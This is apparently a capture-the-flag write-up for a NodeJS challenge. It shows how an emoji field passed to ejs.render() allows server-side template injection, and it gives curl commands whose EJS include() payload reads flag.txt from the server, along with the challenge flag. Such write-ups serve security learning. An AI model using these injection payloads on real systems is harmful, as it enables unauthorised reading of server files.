# Emotional

> Don't be shy, show your emotions! Get emotional if you have to! Uncover the flag.

NodeJS ServerSide Template Injection

The `emoji` parameter is injected directly into `ejs.render()` which allows for template injection.

```js
const renderedHtml = ejs.render(profilePage, { profileEmoji: profile.emoji });
```

Using `include()`, we can load `flag.txt` into the DOM.
We do need to specify the current working directory (cwd) so our file can be found.

```
curl 'http://localhost:3000/setEmoji' -X POST --data-raw 'emoji=<%- include(process.cwd() + "/flag.txt"); %>'

# URL encoded
curl 'http://localhost:3000/setEmoji' -X POST --data-raw 'emoji=%3C%25-%20include%28process.cwd%28%29%20%2B%20%22%2Fflag.txt%22%29%3B%20%25%3E'
```

Then load the page to get the flag:

```
curl 'http://localhost:3000'

#...
            <h2><b>Get Emotional!</b></h2>
            <div class="current-emoji">
                <span id="currentEmoji">NOT-THE-REAL-FLAG</span>
            </div>
#...
```

`flag{8c8e0e59d1292298b64c625b401e8cfa}`